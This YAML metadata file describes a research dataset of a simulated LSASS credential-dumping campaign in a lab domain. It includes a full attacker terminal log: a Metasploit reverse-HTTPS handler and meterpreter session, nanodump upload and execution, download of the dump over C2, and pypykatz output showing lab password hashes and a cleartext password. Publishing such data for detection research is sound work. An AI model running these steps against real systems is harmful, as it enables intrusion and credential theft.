@@ -1,0 +1,631 @@
+title: LSASS Memory - Nanodump
+id: 053e7474-9f53-400d-89e2-2ae71f6d8baa
+contributors:
+  - Jose Rodriguez @Cyb3rPandaH
+creation_date: 2023/09/06
+modification_date: 2023/09/06
+platform:
+  - Windows
+type: compound
+tags:
+description: |-
+  Datasets created while simulating a threat actor stealing credential material from the process memory of LSASS.exe.
+  Tactics covered during this simulation include:
+    - Resource development (malicious payload via http server)
+    - Execution (initial access via execution of malicious payload)
+    - Discovery (System information and system owner)
+    - Command & Control (Transfer of nanodummp.x64.exe)
+    - Credential Access (Full dump file of LSASS.exe using nanodump.x64.exe)
+    - Exfiltration (Over C2 channel)
+
+  Host and Network data do not include the development of malicious payload.
+attack_mappings:
+  - technique: T1587
+    sub-technique: "001"
+    tactics:
+      - TA0042
+  - technique: T1608
+    sub-technique: "001"
+    tactics:
+      - TA0042
+  - technique: T1204
+    sub-technique: "002"
+    tactics:
+      - TA0002
+  - technique: T1082
+    sub-technique:
+    tactics:
+      - TA0007
+  - technique: T1033
+    sub-technique:
+    tactics:
+      - TA0007
+  - technique: T1105
+    sub-technique:
+    tactics:
+      - TA0011
+  - technique: T1003
+    sub-technique: "001"
+    tactics:
+      - TA0006
+  - technique: T1041
+    sub-technique:
+    tactics:
+      - TA0010
+notebooks:
+files:
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/LSASS_campaign_07/metasploit_nanodump_lsass_memory_dump_pcapng.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/LSASS_campaign_07/metasploit_nanodump_lsass_memory_dump_zeek_logs.zip
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/LSASS_campaign_07/metasploit_nanodump_lsass_memory_dump.zip
+simulation:
+  environment: VirtualBox
+  tools:
+    - type: C2
+      name: Metasploit
+      module: meterpreter
+      script: execute -f C:\\Windows\\System32\\nanodump.x64.exe -H -i -a "--write C:\Windows\Temp\lsass_dump.dmp"
+    - type: application
+      name: nanodump.exe
+    - type: application
+      name: pypykatz
+      module: minidump
+      script: |-
+        ./Desktop/restore_signature lsass_dump.dmp 
+        python3 -m pypykatz lsa minidump lsass_dump.dmp
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+        ┌──(adversary㉿kali)-[~]
+        └─$ sudo su
+        [sudo] password for adversary: 
+        ┌──(root㉿kali)-[/home/adversary]
+        └─# systemctl start postgresql
+                                                                                                                                        
+        ┌──(root㉿kali)-[/home/adversary]
+        └─# msfdb init
+        [i] Database already started
+        [+] Creating database user 'msf'
+        [+] Creating databases 'msf'
+        [+] Creating databases 'msf_test'
+        [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+        [+] Creating initial database schema
+                                                                                                                                        
+        ┌──(root㉿kali)-[/home/adversary]
+        └─# msfconsole -q
+        msf6 > use multi/handler
+        [*] Using configured payload generic/shell_reverse_tcp
+        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+        payload => windows/x64/meterpreter/reverse_https
+        msf6 exploit(multi/handler) > set lhost 10.0.5.14
+        lhost => 10.0.5.14
+        msf6 exploit(multi/handler) > set lport 6666
+        lport => 6666
+        msf6 exploit(multi/handler) > run
+
+        [*] Started HTTPS reverse handler on https://10.0.5.14:6666
+        [*] https://10.0.5.14:6666 handling request from 10.0.5.18; (UUID: ev6thhc1) Staging x64 payload (201820 bytes) ...
+        [*] Meterpreter session 1 opened (10.0.5.14:6666 -> 10.0.5.18:5707) at 2023-09-06 10:15:45 -0400
+
+        meterpreter > shell
+        Process 6580 created.
+        Channel 1 created.
+        Microsoft Windows [Version 10.0.19045.2006]
+        (c) Microsoft Corporation. All rights reserved.
+
+        C:\Users\stevie.marie\Downloads>systeminfo
+        systeminfo
+
+        Host Name:                 MKT01
+        OS Name:                   Microsoft Windows 10 Enterprise Evaluation
+        OS Version:                10.0.19045 N/A Build 19045
+        OS Manufacturer:           Microsoft Corporation
+        OS Configuration:          Member Workstation
+        OS Build Type:             Multiprocessor Free
+        Registered Owner:          stevie
+        Registered Organization:   
+        Product ID:                00329-20000-00001-AA584
+        Original Install Date:     9/3/2023, 11:10:52 PM
+        System Boot Time:          9/6/2023, 6:36:52 AM
+        System Manufacturer:       innotek GmbH
+        System Model:              VirtualBox
+        System Type:               x64-based PC
+        Processor(s):              1 Processor(s) Installed.
+                                [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2397 Mhz
+        BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+        Windows Directory:         C:\Windows
+        System Directory:          C:\Windows\system32
+        Boot Device:               \Device\HarddiskVolume1
+        System Locale:             en-us;English (United States)
+        Input Locale:              en-us;English (United States)
+        Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+        Total Physical Memory:     4,096 MB
+        Available Physical Memory: 2,044 MB
+        Virtual Memory: Max Size:  5,504 MB
+        Virtual Memory: Available: 3,643 MB
+        Virtual Memory: In Use:    1,861 MB
+        Page File Location(s):     C:\pagefile.sys
+        Domain:                    pandalab.com
+        Logon Server:              N/A
+        Hotfix(s):                 5 Hotfix(s) Installed.
+                                [01]: KB5017022
+                                [02]: KB5015684
+                                [03]: KB5017308
+                                [04]: KB5014032
+                                [05]: KB5016705
+        Network Card(s):           1 NIC(s) Installed.
+                                [01]: Intel(R) PRO/1000 MT Desktop Adapter
+                                        Connection Name: Ethernet
+                                        DHCP Enabled:    No
+                                        IP address(es)
+                                        [01]: 192.168.56.30
+                                        [02]: fe80::1527:12fb:f098:f42d
+        Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+        C:\Users\stevie.marie\Downloads>whoami & whoami /groups
+        whoami & whoami /groups
+        pandalab\pedro.gustavo
+
+        GROUP INFORMATION
+        -----------------
+
+        Group Name                                      Type             SID                                           Attributes                                                     
+        =============================================== ================ ============================================= ===============================================================
+        Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group             
+        BUILTIN\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group             
+        BUILTIN\Performance Log Users                   Alias            S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group             
+        BUILTIN\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+        NT AUTHORITY\INTERACTIVE                        Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group             
+        CONSOLE LOGON                                   Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group             
+        NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group             
+        NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group             
+        LOCAL                                           Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group             
+        PANDALAB\Domain Admins                          Group            S-1-5-21-3550837308-1175438220-1610417319-512 Mandatory group, Enabled by default, Enabled group             
+        Authentication authority asserted identity      Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group             
+        PANDALAB\Denied RODC Password Replication Group Alias            S-1-5-21-3550837308-1175438220-1610417319-572 Mandatory group, Enabled by default, Enabled group, Local Group
+        Mandatory Label\High Mandatory Level            Label            S-1-16-12288                                                                                                 
+
+        C:\Users\stevie.marie\Downloads>exit
+        exit
+        meterpreter > upload /home/adversary/Desktop/nanodump.x64.exe C:\\Windows\\System32\\nanodump.x64.exe
+        [*] Uploading  : /home/adversary/Desktop/nanodump.x64.exe -> C:\Windows\System32\nanodump.x64.exe
+        [*] Uploaded 106.00 KiB of 106.00 KiB (100.0%): /home/adversary/Desktop/nanodump.x64.exe -> C:\Windows\System32\nanodump.x64.exe
+        [*] Completed  : /home/adversary/Desktop/nanodump.x64.exe -> C:\Windows\System32\nanodump.x64.exe
+        meterpreter > execute -f C:\\Windows\\System32\\nanodump.x64.exe -H -i -a "--write C:\Windows\Temp\lsass_dump.dmp"
+        Process 7112 created.
+        Channel 3 created.
+        The minidump has an invalid signature, restore it running:
+        scripts/restore_signature lsass_dump.dmp
+        Done, to get the secretz run:
+        python3 -m pypykatz lsa minidump lsass_dump.dmp
+        mimikatz.exe "sekurlsa::minidump lsass_dump.dmp" "sekurlsa::logonPasswords full" exit
+        meterpreter > download C:\\Windows\\Temp\\lsass_dump.dmp
+        [*] Downloading: C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 1.00 MiB of 10.00 MiB (10.0%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 2.00 MiB of 10.00 MiB (19.99%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 3.00 MiB of 10.00 MiB (29.99%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 4.00 MiB of 10.00 MiB (39.98%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 5.00 MiB of 10.00 MiB (49.98%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 6.00 MiB of 10.00 MiB (59.98%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 7.00 MiB of 10.00 MiB (69.97%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 8.00 MiB of 10.00 MiB (79.97%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 9.00 MiB of 10.00 MiB (89.96%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 10.00 MiB of 10.00 MiB (99.96%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Downloaded 10.00 MiB of 10.00 MiB (100.0%): C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        [*] Completed  : C:\Windows\Temp\lsass_dump.dmp -> /home/adversary/lsass_dump.dmp
+        meterpreter > exit
+        [*] Shutting down Meterpreter...
+
+        [*] 10.0.5.18 - Meterpreter session 1 closed.  Reason: User exit
+        msf6 exploit(multi/handler) > exit
+                                                                                                                                        
+        ┌──(root㉿kali)-[/home/adversary]
+        └─# ./Desktop/restore_signature lsass_dump.dmp 
+        done, to analize the dump run:
+        python3 -m pypykatz lsa minidump lsass_dump.dmp
+                                                                                                                                        
+        ┌──(root㉿kali)-[/home/adversary]
+        └─# python3 -m pypykatz lsa minidump lsass_dump.dmp 
+        INFO:pypykatz:Parsing file lsass_dump.dmp
+        FILE: ======== lsass_dump.dmp =======
+        == LogonSession ==
+        authentication_id 8410620 (8055fc)
+        session_id 1
+        username pedro.gustavo
+        domainname PANDALAB
+        logon_server DC01
+        logon_time 2023-09-06T14:15:30.723892+00:00
+        sid S-1-5-21-3550837308-1175438220-1610417319-1105
+        luid 8410620
+                == MSV ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: 08ec3a969279991505b34da7e6a0f431
+                        SHA1: dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                        DPAPI: 3541ff4bce4c001f579b0c17779779ea
+                == WDIGEST [8055fc]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB.COM
+                == WDIGEST [8055fc]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == DPAPI [8055fc]==
+                        luid 8410620
+                        key_guid 988ac53b-db0e-4af1-b757-43dfff564d29
+                        masterkey f1f8a5578221de560dfa0b784390efeeb5bc8e9fee1e6acce47799dc23a3983a13fefafad45ae9c55ded16bbb857c8d9c67a08a40af690ac1d51cb4284511ac7
+                        sha1_masterkey 5d7d87256a81d95aa842ed59047100db6f904354
+
+        == LogonSession ==
+        authentication_id 7661067 (74e60b)
+        session_id 1
+        username pedro.gustavo
+        domainname PANDALAB
+        logon_server DC01
+        logon_time 2023-09-06T14:13:39.248119+00:00
+        sid S-1-5-21-3550837308-1175438220-1610417319-1105
+        luid 7661067
+                == MSV ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: 08ec3a969279991505b34da7e6a0f431
+                        SHA1: dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                        DPAPI: 3541ff4bce4c001f579b0c17779779ea
+                == WDIGEST [74e60b]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB.COM
+                        Password: P3dr0Gust@v02023
+                        password (hex)5000330064007200300047007500730074004000760030003200300032003300
+                == WDIGEST [74e60b]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 3875565 (3b22ed)
+        session_id 1
+        username pedro.gustavo
+        domainname PANDALAB
+        logon_server DC01
+        logon_time 2023-09-05T15:38:21.283040+00:00
+        sid S-1-5-21-3550837308-1175438220-1610417319-1105
+        luid 3875565
+                == MSV ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: 08ec3a969279991505b34da7e6a0f431
+                        SHA1: dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                        DPAPI: 3541ff4bce4c001f579b0c17779779ea
+                == WDIGEST [3b22ed]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB.COM
+                        Password: P3dr0Gust@v02023
+                        password (hex)5000330064007200300047007500730074004000760030003200300032003300
+                == WDIGEST [3b22ed]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 3675663 (38160f)
+        session_id 1
+        username pedro.gustavo
+        domainname PANDALAB
+        logon_server DC01
+        logon_time 2023-09-05T15:37:41.921108+00:00
+        sid S-1-5-21-3550837308-1175438220-1610417319-1105
+        luid 3675663
+                == MSV ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: 08ec3a969279991505b34da7e6a0f431
+                        SHA1: dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                        DPAPI: 3541ff4bce4c001f579b0c17779779ea
+                == WDIGEST [38160f]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: pedro.gustavo
+                        Domain: PANDALAB.COM
+                        Password: P3dr0Gust@v02023
+                        password (hex)5000330064007200300047007500730074004000760030003200300032003300
+                == WDIGEST [38160f]==
+                        username pedro.gustavo
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 495168 (78e40)
+        session_id 1
+        username stevie.marie
+        domainname PANDALAB
+        logon_server DC01
+        logon_time 2023-09-05T15:20:40.741883+00:00
+        sid S-1-5-21-3550837308-1175438220-1610417319-1106
+        luid 495168
+                == MSV ==
+                        Username: stevie.marie
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: a9ef4276cee5c5e55cb28a8eb7520d47
+                        SHA1: 4b8c953c57e5a4d8daa7d464dbd3333572b8ed1c
+                        DPAPI: 0bbd18a0b6866c058ea787350b1fb404
+                == WDIGEST [78e40]==
+                        username stevie.marie
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: stevie.marie
+                        Domain: PANDALAB.COM
+                == WDIGEST [78e40]==
+                        username stevie.marie
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == DPAPI [78e40]==
+                        luid 495168
+                        key_guid e2023648-0a72-4113-8a57-e031a438029e
+                        masterkey ce2d43eccd981b92e1b75d455a770f05323ebe48f5ddefbcf5b9ca659e9db9b0fe42e90def7e6b234723b0c1d1a80eada97b4553a48eb82fa68a8dffb13233d1
+                        sha1_masterkey 9621b38e499bb288b6bfe18bf8f95c2915975773
+
+        == LogonSession ==
+        authentication_id 997 (3e5)
+        session_id 0
+        username LOCAL SERVICE
+        domainname NT AUTHORITY
+        logon_server 
+        logon_time 2023-09-05T18:15:18.857979+00:00
+        sid S-1-5-19
+        luid 997
+                == Kerberos ==
+                        Username: 
+                        Domain: 
+
+        == LogonSession ==
+        authentication_id 61367 (efb7)
+        session_id 1
+        username DWM-1
+        domainname Window Manager
+        logon_server 
+        logon_time 2023-09-05T18:15:03.420269+00:00
+        sid S-1-5-90-0-1
+        luid 61367
+                == MSV ==
+                        Username: MKT01$
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: d816f34f18f68c9b51857743d2dad15a
+                        SHA1: 880724e469aa76ba332ba4347af804079088ba83
+                        DPAPI: NA
+                == WDIGEST [efb7]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: MKT01$
+                        Domain: pandalab.com
+                        Password: 1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                        password (hex)1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                == WDIGEST [efb7]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 61194 (ef0a)
+        session_id 1
+        username DWM-1
+        domainname Window Manager
+        logon_server 
+        logon_time 2023-09-05T18:15:03.404600+00:00
+        sid S-1-5-90-0-1
+        luid 61194
+                == MSV ==
+                        Username: MKT01$
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: d816f34f18f68c9b51857743d2dad15a
+                        SHA1: 880724e469aa76ba332ba4347af804079088ba83
+                        DPAPI: NA
+                == WDIGEST [ef0a]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: MKT01$
+                        Domain: pandalab.com
+                        Password: 1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                        password (hex)1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                == WDIGEST [ef0a]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 996 (3e4)
+        session_id 0
+        username MKT01$
+        domainname PANDALAB
+        logon_server 
+        logon_time 2023-09-05T18:14:57.685898+00:00
+        sid S-1-5-20
+        luid 996
+                == MSV ==
+                        Username: MKT01$
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: d816f34f18f68c9b51857743d2dad15a
+                        SHA1: 880724e469aa76ba332ba4347af804079088ba83
+                        DPAPI: NA
+                == WDIGEST [3e4]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: mkt01$
+                        Domain: PANDALAB.COM
+                == WDIGEST [3e4]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 38456 (9638)
+        session_id 0
+        username UMFD-0
+        domainname Font Driver Host
+        logon_server 
+        logon_time 2023-09-05T18:14:52.125917+00:00
+        sid S-1-5-96-0-0
+        luid 38456
+                == MSV ==
+                        Username: MKT01$
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: d816f34f18f68c9b51857743d2dad15a
+                        SHA1: 880724e469aa76ba332ba4347af804079088ba83
+                        DPAPI: NA
+                == WDIGEST [9638]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: MKT01$
+                        Domain: pandalab.com
+                        Password: 1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                        password (hex)1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                == WDIGEST [9638]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 38353 (95d1)
+        session_id 1
+        username UMFD-1
+        domainname Font Driver Host
+        logon_server 
+        logon_time 2023-09-05T18:14:52.076922+00:00
+        sid S-1-5-96-0-1
+        luid 38353
+                == MSV ==
+                        Username: MKT01$
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: d816f34f18f68c9b51857743d2dad15a
+                        SHA1: 880724e469aa76ba332ba4347af804079088ba83
+                        DPAPI: NA
+                == WDIGEST [95d1]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: MKT01$
+                        Domain: pandalab.com
+                        Password: 1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                        password (hex)1a7a7eb66e140ffc913dc09f9a3bd4c2328611972a3f35c68f9c441e7923dd033607ccdd854c448478c39f6bf00539212771d71a5ff693753326750baa209a2f2c13b0a49b090a47993b0ce2d36173357462fc43b0f2aca71656df30b67766744340959a9543a6497896b014d11db3f31df130ee7b97a3c9fff0288f8f94f3bb32c6ae6e6a27951b13089ccdec8a7b3071ec1f99807b8971a1afe8dfca26396077a9994028f4467cde47734d398aee0123919f39b49ee923d1dc8bd85b5a3045d90108d87f2432cc27a5493b3f894506f5a4055238cbc0ffd6107181d58f86d0642ad2b39d1bdc007b66559f54701f64
+                == WDIGEST [95d1]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+
+        == LogonSession ==
+        authentication_id 36424 (8e48)
+        session_id 0
+        username 
+        domainname 
+        logon_server 
+        logon_time 2023-09-05T18:14:36.686623+00:00
+        sid None
+        luid 36424
+                == MSV ==
+                        Username: MKT01$
+                        Domain: PANDALAB
+                        LM: NA
+                        NT: d816f34f18f68c9b51857743d2dad15a
+                        SHA1: 880724e469aa76ba332ba4347af804079088ba83
+                        DPAPI: NA
+
+        == LogonSession ==
+        authentication_id 999 (3e7)
+        session_id 0
+        username MKT01$
+        domainname PANDALAB
+        logon_server 
+        logon_time 2023-09-05T18:14:29.389613+00:00
+        sid S-1-5-18
+        luid 999
+                == WDIGEST [3e7]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == Kerberos ==
+                        Username: mkt01$
+                        Domain: PANDALAB.COM
+                == WDIGEST [3e7]==
+                        username MKT01$
+                        domainname PANDALAB
+                        password None
+                        password (hex)
+                == DPAPI [3e7]==
+                        luid 999
+                        key_guid 0c3bc684-1750-49f1-bf35-15b3619f2439
+                        masterkey 45324f837d5a7d7195d8347874c66217d88178abe05b56f788bf24ab7f9994e79c84498bf6028ebebd5b9505d48d65e6f939c9d09f2d323026ba80340c755acb
+                        sha1_masterkey 16a5c3b28015a9986a4d883cd1c76380c9713dc7
+                == DPAPI [3e7]==
+                        luid 999
+                        key_guid 7d81bb86-30ae-4428-9d36-4ed1d15e3bbc
+                        masterkey 7e4538f36d62b430a17ea1eba32ec96126c434343a3ebf0272a88f0624b30d402cebb15b509342419dbbcc57bae206979fd0bcd6858d1128e90313e96edbc87a
+                        sha1_masterkey 4fbca87fe863ac67c8419d1d398f872b2fea578c
+                == DPAPI [3e7]==
+                        luid 999
+                        key_guid 3b01e467-126f-4674-9ef8-eff5c80294c0
+                        masterkey 9ffc918711da770b201476110ff2e93d578272b4b8dcc88bd24ea3d61f9ee3c74b22b859d964d0498b4cc3b46972f95c1703e3c3f1f594d495d857a9e17e71c0
+                        sha1_masterkey bc525aea71485cece2e7caec9ad04b9362d5b9ec
+
+                                                                                                                                        
+        ┌──(root㉿kali)-[/home/adversary]
+        └─# 
+references:
+  - https://github.com/fortra/nanodump
+  - https://youtube.com/playlist?list=PLHj4xFI1LxMsYLOfBz2PmBZyLeNeOT6vJ
+  - https://attack.mitre.org/techniques/T1003/001/
